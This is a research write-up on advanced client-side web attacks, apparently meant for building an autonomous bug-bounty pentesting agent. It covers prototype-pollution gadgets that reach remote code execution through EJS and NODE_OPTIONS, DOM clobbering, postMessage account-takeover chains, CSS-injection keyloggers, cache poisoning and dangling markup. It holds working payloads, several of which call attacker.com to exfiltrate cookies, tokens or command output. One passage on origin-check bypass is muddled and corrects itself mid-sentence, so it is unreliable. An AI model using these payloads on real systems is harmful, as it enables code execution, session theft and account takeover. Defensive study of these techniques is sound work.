# R4.3 - Advanced Client-Side Attacks
## Prototype Pollution, DOM Clobbering, postMessage Chains, CSS Injection, Cache Poisoning, Dangling Markup

**Research Date:** 2026-03-25
**Round:** 4.3 - Advanced Client-Side Attack Techniques

---

## 1. Server-Side Prototype Pollution to RCE

### The Mechanism

JavaScript objects inherit properties from their prototype chain. When user-controlled input is merged into an object without sanitization (e.g., `Object.assign`, lodash `merge`, `deepmerge`), an attacker can set properties on `Object.prototype` itself by injecting keys like `__proto__`, `constructor.prototype`, or via `Object.prototype` directly. Every object in the process then inherits these injected properties.

On the server, this creates gadget chains where application code reads a polluted property from an object that never explicitly defined it, and the value comes from the attacker-controlled prototype.

### Detection: Blind SSPP Techniques

Direct observation is often impossible - the injected property exists server-side. Proven blind detection methods:

**Status code probing:** Send a JSON body with `{"__proto__": {"status": 510}}`. If the next response (or error response) returns a 510, the prototype was polluted. Alternatively, pollute `{"__proto__": {"cache-control": "no-cache"}}` on a cacheable endpoint - a previously 304 response will switch to 200 with the header added.

**JSON spaces technique:** Pollute `{"__proto__": {"json spaces": 1}}`. JSON serialization libraries that read `json spaces` from options (which falls back to prototype) will start returning pretty-printed JSON, detectable in the response body.

**Charset reflection:** Pollute `{"__proto__": {"content-type": "application/json; charset=injected"}}` - if the charset appears in subsequent responses, the prototype is injectable.

**Burp BCheck:** PortSwigger's Scanner ships a built-in BCheck for SSPP that automates these probes.

### Gadget Chain 1: EJS Template Engine (CVE-2022-29078)

EJS uses `opts.outputFunctionName` to name the output buffer function in compiled templates. If this option is undefined, EJS reads it from... whatever the options object's prototype says. Polluting `outputFunctionName` with malicious code injects it directly into the compiled template function body that gets `eval`'d.

Full exploit payload:

```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');x"
  }
}
```

The `mizu.re` research on EJS gadgets also documents the `escapeFunction` sink: EJS calls `opts.escapeFunction` on template output. Polluting this to a function-like string that calls `execSync` achieves the same result.

Additionally, EJS's `client` option disables HTML escaping for client-side template compilation. Combined with `escapeFunction` pollution:

```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('curl attacker.com/`id`')//"
  }
}
```

### Gadget Chain 2: Pug Template Engine

Pug reads `self`, `globals`, and `compileDebug` from the options object. The critical gadget is the `block` property - when `opts.block` or related render options are polluted, Pug's code generation includes the injected content verbatim in compiled JS.

The `pretty` option in older Pug versions is also a gadget - it gets concatenated into template strings during compilation.

### Gadget Chain 3: child_process via NODE_OPTIONS

When application code spawns a child process (using `child_process.fork()`, `spawn()`, or `execFile()`), the spawned process inherits `execArgv` from the options object. If `execArgv` is undefined on the options object, Node reads from the prototype.

```json
{
  "__proto__": {
    "execArgv": ["--import", "data:text/javascript,process.mainModule.require('child_process').execSync('curl attacker.com/$(id)')"]
  }
}
```

The `--import` flag (available Node 18.18+, stable Node 20+) loads an ES module from a data URI at process startup. This is more reliable than `--eval` for complex payloads.

For `fork()` specifically:

```json
{
  "__proto__": {
    "NODE_OPTIONS": "--import data:text/javascript,require('child_process').execSync('id>/tmp/x')"
  }
}
```

The "Silent Spring" USENIX 2023 paper catalogued 11 distinct Node.js gadget chains across popular libraries (lodash, jquery, express, bluebird, etc.). The KTH-LangSec GitHub repository maintains an active collection of server-side PP gadgets.

### Detection by Autonomous Agent

1. Identify all JSON-accepting POST/PUT/PATCH endpoints.
2. Send probe: `{"__proto__": {"x_pp_probe_<rand>": true}}` and separately `{"constructor": {"prototype": {"x_pp_probe_<rand>": true}}}`.
3. Inspect responses for: presence of probe key in JSON output, status code changes, error message format changes, response body size changes (json spaces gadget).
4. For confirmed SSPP: attempt template engine gadgets based on detected tech stack (X-Powered-By, error messages, import paths in JS bundles).

---

## 2. DOM Clobbering

### The Core Mechanism

The HTML specification's "named property access" rule states that when JavaScript reads `window.foo` or `document.foo`, the browser first checks if there is an HTML element with `id="foo"` or `name="foo"` before looking up real properties. An attacker who can inject benign HTML (no `<script>`, just markup) can therefore overwrite JavaScript global variables and object properties.

This is critical because many sanitizers (DOMPurify, html-sanitize) allow `id` and `name` attributes - they are not XSS vectors by themselves, yet they enable clobbering.

### Basic Clobbering: Single Level

```html
<a id="someConfig" href="https://attacker.com/evil.js"></a>
```

If application code later does `let url = window.someConfig || defaultConfig; loadScript(url)`, the attacker controls the script URL without injecting any JS.

### Intermediate Clobbering: Property Access

To clobber `obj.property`, use two elements with the same `id` - the browser creates an `HTMLCollection`, and named properties on collections resolve to `name` attributes:

```html
<a id="config"></a>
<a id="config" name="url" href="https://attacker.com/evil.js"></a>
```

`window.config.url` now returns the `href` value.

### Advanced Clobbering: Deeply Nested Objects

To clobber `a.b.c`, use `iframe` + `srcdoc`:

```html
<iframe name="a" srcdoc="
  <a id='b'></a>
  <a id='b' name='c' href='javascript:alert(1)'></a>
"></iframe>
```

`window.a` resolves to the iframe's `contentWindow`. `window.a.b` resolves to the HTMLCollection inside the iframe. `window.a.b.c` resolves to the `href` of the anchor with `name="c"`.

This three-level deep clobbering was documented in PortSwigger's "DOM clobbering strikes back" research.

### Real-World CVE Example: Astro Router (2024)

GHSA-m85w-3h95-hcf9 in Astro's client-side router: the router read `window.__swc_hmr_runtime` (or similar internal property) without null-checking. An attacker injecting `<iframe name="__swc_hmr_runtime" srcdoc="...">` could override what the router treated as its runtime object, redirecting navigation to attacker-controlled URLs, resulting in XSS.

### Clobbering Patterns That Lead to XSS

- `document.querySelector` results stored in global variables, later used as script sources
- `innerHTML` assignments reading from `window.config.template`
- `eval()` or `Function()` calls where the code string comes from a clobberable global
- DOMPurify's `ALLOWED_ATTR` if config object is clobberable
- `fetch()` URL reads from a clobberable property

### Detection by Autonomous Agent

1. Parse all JavaScript files for patterns: `window[varName]`, `document[varName]`, accessing globals without `typeof` guard, accessing multi-level properties without existence checks.
2. Identify which globals are never explicitly assigned (potential clobber targets).
3. Check if the application accepts HTML input that passes through a sanitizer allowing `id`/`name` attributes.
4. In headless browser: inject test payload `<a id="__test_clob__" href="//attacker.com">` then evaluate `window.__test_clob__` - if it returns the element, the site is clobberable.

---

## 3. postMessage to Account Takeover Chains

### How postMessage Works

`window.postMessage(data, targetOrigin)` sends a message to another window (iframe, popup). The receiver installs `window.addEventListener('message', handler)`. Bugs arise when:
- The sender uses `"*"` as `targetOrigin` (broadcasts to all origins)
- The receiver does not check `event.origin`
- The receiver checks origin weakly (substring, regex with dot wildcard)
- The message content is passed to dangerous sinks without sanitization

### Exploit Chain Type 1: Missing Origin Check to XSS

If the receiver does:
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data.html;
});
```

The attacker opens the target in an iframe or popup and sends:
```javascript
target.postMessage({html: '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>'}, '*');
```

### Exploit Chain Type 2: Weak Origin Check Bypass

**indexOf bypass:** Receiver checks `e.origin.indexOf('trusted.com') !== -1`. Attacker registers `trustedxcom.attacker.com` - the check passes because the string `trusted.com` appears nowhere... wait, they must register a subdomain: `trusted.com.attacker.com` with a domain like `attacker-trusted.com`. Alternatively: `evil-trusted.com` fails, but `trusted.com.evil.com` passes indexOf.

**Regex dot wildcard:** Receiver checks `/^https:\/\/trusted\.com$/.test(e.origin)` - actually this is correct. But `/trusted.com/.test(e.origin)` matches `trustedXcom.evil.com`.

**Protocol confusion:** `http://trusted.com` vs `https://trusted.com` - if check is case-insensitive string match on just the hostname.

### Exploit Chain Type 3: Token Leakage via Wildcard Sender

Application sends OAuth tokens or session data via postMessage to a child iframe, using `"*"` as target origin:

```javascript
// Parent (victim) sends token to child using wildcard
iframe.contentWindow.postMessage({token: authToken}, '*');
```

Attacker's page can race this by opening the victim, injecting their own iframe into the victim page (if self-XSS or subdomain takeover exists), or using the `opener` reference if the victim page was opened via `window.open()` by the attacker.

### Real-World Chain: Meta Pixel (Reported Oct 2024, $32,500 Bounty)

Documented by `ysamm.com`: `fbevents.js` (Meta Pixel), embedded on millions of third-party sites, registered a `message` event listener that trusted any message where `event.origin` was `*.facebook.com`. The listener issued requests to `graph.facebook.com` including the current page's `location.href` and `document.referrer` in the request body.

Attack chain:
1. Attacker creates a Facebook app with a domain that is a `*.facebook.com` subdomain (via Facebook Canvas or app hosting).
2. Victim visits attacker's Facebook-hosted page.
3. Attacker page sends crafted `postMessage` - origin is `facebook.com`.
4. `fbevents.js` on the third-party site (in another tab/window opened by the attacker) trusts the message.
5. `fbevents.js` issues an authenticated request to Graph API leaking the victim's session context, enabling Instagram account takeover.

### Real-World Chain: Microsoft Services (2025)

Microsoft MSRC published research in August 2025 documenting multiple high-impact postMessage vulnerabilities across Microsoft services. The common thread: services implicitly trusted messages from within their own domain ecosystem, and token forwarding handlers would relay auth tokens to origins specified in the message payload without validation, enabling cross-tenant token exfiltration.

### Full ATO Chain Pattern

1. Find page with `message` listener that processes auth actions (token storage, redirect, login callback).
2. Check if the page can be iframed (missing `X-Frame-Options`/`frame-ancestors`).
3. Verify origin check is absent or bypassable.
4. Attacker page opens victim in iframe.
5. Send postMessage to trigger auth action - e.g., `{action: 'setToken', token: attacker_token}` forces victim to store attacker's token, logging victim into attacker's account (ATO via account confusion). Or `{action: 'navigate', url: '//attacker.com?callback='}` triggers redirect with victim's token appended.

### Detection by Autonomous Agent

1. Spider all JS files, extract `addEventListener('message'` and `on('message'` handlers.
2. Analyze handler body: check for `e.origin` or `event.origin` validation; flag absent or weak checks.
3. Check if pages with `message` handlers lack `X-Frame-Options`/`CSP frame-ancestors` (enabling iframe embedding).
4. In headless browser: open target page, inject postMessage from a controlled origin, observe DOM changes, network requests, storage mutations.
5. Search for wildcard `postMessage(data, '*')` calls that include auth tokens.

---

## 4. CSS Injection and Data Exfiltration

### Why CSS Injection Matters

Many CSPs that block `<script>` still allow `<style>` or `style` attributes. CSS injection without JS execution can:
- Exfiltrate attribute values (CSRF tokens, API keys in hidden inputs, auth tokens in data attributes)
- Detect page state / A/B test conditions
- Serve as a stepping stone for further attacks
- Create a pure-CSS keylogger

### Attribute Selector Exfiltration

CSS attribute selectors allow matching elements by attribute value prefix, suffix, or substring. Combined with `background: url()`, each match triggers an HTTP request:

```css
input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/?c=a); }
input[name="csrf_token"][value^="b"] { background: url(https://attacker.com/?c=b); }
/* ... all 62 chars ... */
```

Each injected rule probes one character position. The attacker receives a request only for the matching prefix, revealing the first character. Then they inject rules for the second character given the known first, etc. This is character-by-character brute-force over many page loads.

**Single-shot optimization:** For 32-char CSRF tokens (hex), inject 32 x 16 = 512 rules, one per (position, character) pair. The attacker receives exactly 32 requests - one per position. Requires 32 page views but each view is independent.

### Font-Face Keylogger

```css
@font-face {
    font-family: 'exfil';
    src: url('https://attacker.com/?c=a') format('woff');
    unicode-range: U+0061;
}
@font-face {
    font-family: 'exfil';
    src: url('https://attacker.com/?c=b') format('woff');
    unicode-range: U+0062;
}
/* One rule per character */
input { font-family: 'exfil', fallback; }
```

When a user types a character in an `input` field, the browser loads the custom font for that unicode code point - triggering an HTTP request per unique character. Repeated characters only generate one request (fonts cache). Exfiltrates the set of typed characters, not exact sequence or count.

### Inline Style Exfiltration (No Stylesheet Import)

PortSwigger Research published "Inline Style Exfiltration" - exploiting CSS injection through `style` attributes alone (when `<style>` tags are blocked but `style=""` attributes are allowed).

Using chained CSS conditionals:
```html
<div style="--x: ; color: red; background: url(attacker.com/?leak=START)">
```

CSS custom properties allow injection of arbitrary content into the `style` attribute value. By injecting `; property: value` sequences, properties that trigger network requests can be activated. The key insight: CSS custom properties (`--var`) that are unrecognized cascade silently, but can be read by `var()` in values that do cause requests.

### uBlock / Ad Blocker Exploitation

The 2024 PortSwigger "uBlock, I exfiltrate" research demonstrated that CSS injection rules injected into pages with ad blockers active could trigger ad blocker filter list fetches, creating an oracle for whether certain DOM elements exist (ad blocker rules select specific element patterns) - useful for information disclosure without direct CSS request capability.

### Detection by Autonomous Agent

1. Identify CSS injection points: parameters reflected in `<style>` blocks, `style` attributes, or stylesheet `@import` paths.
2. Test with: injection of a comment `/*probe*/` - if reflected verbatim, injection confirmed.
3. Test with a `background: url(//collaborator.com/css-probe)` rule on a common element like `body` - if request received, full CSS injection confirmed.
4. Assess what sensitive data exists on the page: CSRF tokens, API keys, user data in attributes.

---

## 5. Browser Cache Poisoning

### Server-Side Cache Poisoning with Client-Side Impact

Classic web cache poisoning (Burp's James Kettle research) uses unkeyed HTTP headers to inject malicious content into cached responses, which are then served to all users accessing that URL. The key header categories:

- **Unkeyed headers:** `X-Forwarded-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`
- **Fat GET requests:** Some caches key on URL only, ignoring a request body on GET - body content gets reflected
- **HTTP/2 pseudo-headers:** `:authority`, `:path` - inconsistency between H2 frontend and H1 backend

**XSS via cache poisoning (converting reflected to stored):**

1. Find reflected XSS in a response that gets cached.
2. Inject the payload via an unkeyed header so the URL remains clean.
3. The poisoned response is cached.
4. Every user accessing the clean URL gets the stored XSS payload.

### Next.js CVE-2024-46982

In Next.js 13.5.1 - 14.2.9 (pages router, non-dynamic SSR routes): the framework failed to properly separate cache keys for responses with different `x-middleware-prefetch` header values. A crafted request could poison the cache with a response containing an injected `<script>` tag. The script executed for all subsequent users accessing the same route. Fixed in 13.5.7 / 14.2.10.

### Client-Side Cache Poisoning via Service Workers

Service workers register a `fetch` event handler that intercepts all network requests from the page's scope. If an attacker can register a malicious service worker (via XSS on the same origin, or a misconfigured service worker scope), the service worker can:

1. Intercept all resource requests (scripts, stylesheets, API calls)
2. Return poisoned responses from its internal cache
3. Persist across page reloads, browser restarts (until explicitly unregistered)
4. Operate even when the original XSS entry point is patched

Attack pattern:
1. Achieve XSS on `origin.com` (even self-XSS or one-time reflected XSS)
2. Register service worker: `navigator.serviceWorker.register('/sw.js')` - but the SW script must be served from same origin. If attacker controls any file served from origin (CDN upload, profile image, JSON with JSONP endpoint that reflects JS), they can register a malicious SW.
3. SW intercepts subsequent page loads, injects scripts, persists the compromise.

```javascript
// Malicious service worker - intercepts everything
self.addEventListener('fetch', e => {
    if (e.request.url.includes('/api/')) {
        e.respondWith(fetch(e.request).then(r => {
            // Clone response, modify, re-serve
            return r.clone();
        }));
    }
});
```

### Cache Deception vs Cache Poisoning

**Cache deception:** Trick the cache into storing a response containing victim's private data under a publicly accessible URL. Attacker then fetches that URL to read the data. Uses path confusion: `/account/settings.css` - cache keys on `.css` extension (static), but app serves account page content.

**Detection heuristics:**
- Test static-looking paths appended to dynamic routes: `/dashboard/nonexistent.css`, `/profile/x.jpg`
- Check if response contains authenticated content AND sets `Cache-Control: public` or no cache headers
- Verify cache hit via `Age` header or `X-Cache: HIT`

---

## 6. Dangling Markup Injection

### What It Is

When an attacker can inject HTML but not execute scripts (CSP blocks inline scripts, no `script-src` bypass available), dangling markup allows data exfiltration by injecting an open/unclosed HTML tag whose attribute captures subsequent page content and sends it to an attacker-controlled server via an image load or link prefetch.

### Classic Technique: Unclosed `src` Attribute

Inject:
```html
<img src="https://attacker.com/?data=
```

The `src` attribute begins but never closes with `"`. The HTML parser continues reading the page content as part of the attribute value until it encounters the next `"` character. Anything between the injection point and the next quote character is sent as the `data` query parameter when the browser attempts to load the "image."

This captures whatever text appears next on the page - CSRF tokens in forms, API keys in input values, auth tokens in metadata.

### Alternative: `<base>` Tag Injection

Inject `<base href="https://attacker.com/">` to redirect all relative URLs on the page to the attacker's server. Every relative link, form action, script src, image src becomes an absolute URL pointing at attacker.com. When users click links, their cookies/tokens are sent to attacker.com as Referer headers.

Additionally, `<base target="_blank">` changes the `window.name` of all opened windows to `_blank` - `window.name` persists across navigation and can be read by destination pages, enabling data exfiltration through window.name.

### Technique: Stealing Hidden Field Values

Target: `<input type="hidden" name="csrf" value="TOKEN_VALUE_HERE">`

If injection point is before this input:
```html
<a href="https://attacker.com/
```

The `href` attribute stays open, capturing `">` then the next `"` in the CSRF token value closes the attribute. The parser treats everything between as part of the URL. Request is triggered on click (not automatically), but for `<link rel="preload">` or `<link rel="prefetch">`, the browser fetches automatically.

Better version using `<link>`:
```html
<link rel="prefetch" href="https://attacker.com/?x=
```

Modern browsers prefetch this immediately, exfiltrating the dangling content without user interaction.

### DOM-Based Dangling Markup (PortSwigger Research)

PortSwigger's "Evading CSP with DOM-based dangling markup" extends this to scenarios where the injection is into JavaScript string context rather than HTML. If application code does:

```javascript
document.write('<img src="' + userInput + '">');
```

And `userInput` is attacker-controlled but CSP blocks script, the attacker can inject:
```
x" onerror="/* blocked by CSP */
```

But also:
```
https://attacker.com/?data=
```

Injecting an incomplete URL makes the rest of the page content end up in the query string. PortSwigger documents how this works even when `document.write` is the sink - the dangling attribute captures content from the DOM-written HTML.

### WHATWG Mitigations (2024)

As of 2024-2025, WHATWG added "dangling markup injection prevention" algorithms to the HTML spec - new parsing rules that detect when a URL attribute value contains a newline character (common in dangling markup payloads) and block those requests. Chrome 118+ implements these restrictions. However:
- HTTP responses can omit `Content-Security-Policy` headers
- Legacy browsers remain vulnerable
- Bypass: avoid newlines, use other whitespace characters that are normalized but not yet restricted

---

## 7. Implementation for Autonomous Agents

### Architecture for Client-Side Vulnerability Detection

An autonomous pentesting agent needs a headless browser with full JS execution capability, not just an HTTP client. The required capabilities split into two categories:

**Passive Analysis (no user interaction):**
- Parse and analyze all JavaScript bundles for sink/source patterns
- Identify postMessage listeners and their origin validation logic
- Detect prototype pollution merge functions (lodash, jQuery `$.extend`, `Object.assign` in loops)
- Find DOM clobbering targets: globals accessed without explicit assignment, multi-level property access on `window`/`document`

**Active Probing (headless browser driven):**
- Navigate to pages, inject probes, observe responses
- Execute JS in page context to test prototype pollution: `Object.prototype.__pp_test__ = 1; assert(({}).pp_test === 1)`
- Listen for outbound network requests triggered by injected CSS
- Register fake origins to test postMessage handlers

### Headless Browser APIs Required

```python
# Playwright-based detection harness
from playwright.async_api import async_playwright

async def detect_postmessage_vulns(page_url: str) -> list[dict]:
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        # Page 1: victim
        victim_ctx = await browser.new_context()
        victim_page = await victim_ctx.new_page()

        # Intercept console and network
        victim_page.on('console', lambda msg: analyze_console(msg))
        await victim_page.route('**/*', intercept_requests)

        await victim_page.goto(page_url)

        # Extract all message listeners
        listeners = await victim_page.evaluate('''
            () => {
                const original = window.addEventListener;
                const found = [];
                window.addEventListener = function(type, fn, ...args) {
                    if (type === 'message') {
                        found.push(fn.toString());
                    }
                    return original.call(this, type, fn, ...args);
                };
                return found;
            }
        ''')

        # Page 2: attacker - send postMessage probes
        attacker_page = await browser.new_page()
        await attacker_page.evaluate(f'''
            const victim = window.open('{page_url}');
            setTimeout(() => {{
                victim.postMessage({{xss: '<img src=x onerror=fetch("//probe.attacker.com")>'}}, '*');
                victim.postMessage({{action: 'navigate', url: '//probe.attacker.com'}}, '*');
            }}, 2000);
        ''')
```

### Detection Heuristics

**Prototype Pollution Detection:**
```python
PP_PROBES = [
    ('json_body', '__proto__', '{"__proto__": {"pp_test_1337": true}}'),
    ('json_body', 'constructor', '{"constructor": {"prototype": {"pp_test_1337": true}}}'),
    ('query_param', '__proto__[pp_test_1337]', 'true'),
    ('query_param', 'constructor[prototype][pp_test_1337]', 'true'),
]

def check_pp_reflected(before_response: str, after_response: str) -> bool:
    # Look for probe key appearing in response
    return 'pp_test_1337' in after_response and 'pp_test_1337' not in before_response

def check_pp_json_spaces(before_response: str, after_response: str) -> bool:
    # Polluted json spaces causes pretty-printing
    before_whitespace = before_response.count('\n')
    after_whitespace = after_response.count('\n')
    return after_whitespace > before_whitespace * 2
```

**DOM Clobbering Detection:**
```javascript
// Inject via HTML input, check if clobbering is effective
const TEST_ID = 'pp_clob_test_' + Math.random().toString(36).slice(2);
const payload = `<a id="${TEST_ID}" href="//attacker.com/clob"></a>`;
// POST payload to comment/bio/description field
// Then navigate to page and evaluate:
const clobbered = window[TEST_ID];
if (clobbered && clobbered.href) {
    // Clobbering works - now find dangerous sinks
}
```

**CSS Injection Detection:**
```python
CSS_PROBES = [
    '/*probe_css_injection*/',         # Comment - benign, detects reflection
    'color:red',                        # Simple property - visual change
    'background:url(//collaborator)',   # Network request - confirms injection
]

def detect_css_injection(param: str, value: str) -> bool:
    # Check if probe comment appears in page source
    response = send_request(param=CSS_PROBES[0])
    return '/*probe_css_injection*/' in response.text
```

**Gadget Chain Identification (SSPP):**
1. Detect tech stack from HTTP headers, error messages, `package.json` if exposed.
2. Match against gadget library: EJS (outputFunctionName, escapeFunction), Pug (pretty), lodash (template settings), express-fileupload (parseNested + busboy), child_process (execArgv, NODE_OPTIONS).
3. For each detected gadget-vulnerable library, attempt specific RCE probe with OOB callback.

### Priority Ranking for Bounty Programs

| Attack Class | Avg Severity | Detection Difficulty | Implementation Priority |
|---|---|---|---|
| SSPP to RCE (EJS/Pug gadget) | Critical | Medium | HIGH |
| postMessage ATO (no origin check) | High-Critical | Low-Medium | HIGH |
| DOM Clobbering to XSS | High | Medium | HIGH |
| Cache Poisoning to Stored XSS | High | Medium | MEDIUM |
| CSS Injection token exfil | Medium-High | Low | MEDIUM |
| Dangling Markup CSRF theft | Medium | Low | MEDIUM |
| Service Worker persistence | High | High (requires prior XSS) | LOW |

### Key Libraries for Agent Implementation

- **Playwright** (Python) - headless browser, JS execution, network interception
- **semgrep** - static analysis rules for PP sources/sinks in JS
- **pycparser** / **esprima** (Python esprima port) - AST analysis for postMessage handler logic
- **httpx** - async HTTP with H2 support for cache poisoning probes
- **interactsh** (Burp Collaborator equivalent, self-hosted) - OOB callback server for blind SSPP

---

## References and Sources

- [Server-side prototype pollution - Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side)
- [EJS Server-Side Prototype Pollution Gadgets to RCE - mizu.re](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
- [Silent Spring: Prototype Pollution Leads to RCE in Node.js - USENIX 2023](https://www.usenix.org/system/files/sec23summer_432-shcherbakov-gadgets-prepub.pdf)
- [KTH-LangSec SSPP Gadget Collection - GitHub](https://github.com/KTH-LangSec/server-side-prototype-pollution)
- [Prototype Pollution to RCE - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)
- [DOM Clobbering - Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering Strikes Back - PortSwigger Research](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Bypassing CSP via DOM Clobbering - PortSwigger Research](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM Clobbering Prevention - OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [Astro DOM Clobbering XSS - GHSA-m85w-3h95-hcf9](https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9)
- [postMessage Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities)
- [Instagram ATO via Meta Pixel postMessage - ysamm.com](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- [postMessage Compromised - Microsoft MSRC 2025](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
- [Controlling the web message source - Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
- [Inline Style Exfiltration - PortSwigger Research](https://portswigger.net/research/inline-style-exfiltration)
- [uBlock I Exfiltrate - PortSwigger Research](https://portswigger.net/research/ublock-i-exfiltrate-exploiting-ad-blockers-with-css)
- [CSS Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/CSS%20Injection/)
- [Web Cache Poisoning - Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
- [Next.js Cache Poisoning CVE-2024-46982](https://cybersecuritynews.com/critical-vulnerability-exposes-websites/)
- [Abusing Service Workers - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers)
- [Evading CSP with DOM-based Dangling Markup - PortSwigger Research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [Dangling Markup HTML Scriptless Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
- [Exploiting Postmessage Vulnerabilities - Intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities)
- [Doyensec SSPP Gadgets Finder 2024](https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)
